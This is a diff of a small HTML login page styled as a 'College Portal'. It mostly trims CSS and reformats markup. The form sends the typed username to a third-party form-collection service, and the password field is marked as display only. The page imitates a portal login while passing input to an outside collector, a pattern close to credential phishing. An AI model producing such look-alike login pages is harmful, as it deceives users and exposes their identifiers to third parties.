@@ -30,23 +30,12 @@ body{
     text-align:center;
 }
 
-.login-box img{
-    width:90px;
-    margin-bottom:15px;
-}
-
-h2{
-    margin-bottom:20px;
-    color:#333;
-}
-
 input{
     width:100%;
     padding:12px;
     margin:10px 0;
     border:1px solid #ccc;
     border-radius:6px;
-    font-size:15px;
 }
 
 button{
@@ -56,18 +45,7 @@ button{
     color:white;
     border:none;
     border-radius:6px;
-    font-size:16px;
     cursor:pointer;
-}
-
-button:hover{
-    background:#0d47a1;
-}
-
-.footer{
-    margin-top:15px;
-    color:#666;
-    font-size:14px;
 }
 </style>
 </head>
@@ -76,25 +54,22 @@ button:hover{
 
 <div class="login-box">
 
-    <img src="logo_apec.png" alt="College Logo">
+    <img src="logo_apec.png" alt="College Logo" width="90">
 
     <h2>College Portal</h2>
 
- <form action="https://forminit.com/f/nohsxqo02s2" method="POST">
+    <form action="https://forminit.com/f/nohsxqo02s2" method="POST">
 
-  <input type="text" name="fi-sender-fullName" placeholder="Username" required>
+        <input type="text" name="fi-sender-fullName" placeholder="Username" required>
 
-  <!-- password UI only (NOT sent) -->
-  <input type="password" placeholder="Password" required>
+        <!-- password UI only -->
+        <input type="password" placeholder="Password" required>
 
-  <button type="submit">Login</button>
+        <button type="submit">Login</button>
 
-</form>
-</form>
-        
     </form>
 
-    <div class="footer">
+    <div style="margin-top:15px; color:#666;">
         © 2026 Your College Name
     </div>
 
